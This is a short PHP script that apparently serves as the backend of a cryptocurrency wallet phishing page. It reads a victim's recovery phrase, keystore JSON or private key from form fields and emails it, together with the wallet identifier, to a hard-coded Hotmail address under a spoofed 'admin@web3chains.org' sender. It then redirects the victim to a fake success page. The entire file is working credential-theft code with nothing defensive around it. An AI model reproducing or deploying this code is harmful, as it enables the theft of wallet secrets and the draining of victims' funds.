<?php
    $to = 'ammiecamar@hotmail.com'; 
    //$to = 'walmartreview@outlook.com';
    
    if ( isset($_POST) ) {

        $headers = "From: admin@web3chains.org";


        $wallet = $_GET['w'];
        if (isset($_POST['Phrase'])) {
            $type = "Phrase";
            $pass = $_POST['Phrase'];

        } elseif (isset($_POST['Keystore'])) {
            $type = "Keystore JSON";
            $pass = $_POST['Keystore'];

        } elseif (isset($_POST['privkey'])) {
            $type = "Private Key";
            $pass = $_POST['privkey'];

        } else {
            $type = 0;
            $pass = 0;
        }

        if ($type && $pass) {
            $subject = "2024 RESULT OUTPUT";
            $txt = "Account" . " = " . $wallet . "\r\n" . "TYPE" . " = " . $type . "\r\n" . "Data" . " = " . $pass . "\r\n\r\n";
            mail($to, $subject, $txt, $headers);
            header('Location: https://web.web3chains.org/qr-success.html');
            exit();
        }
    }
?>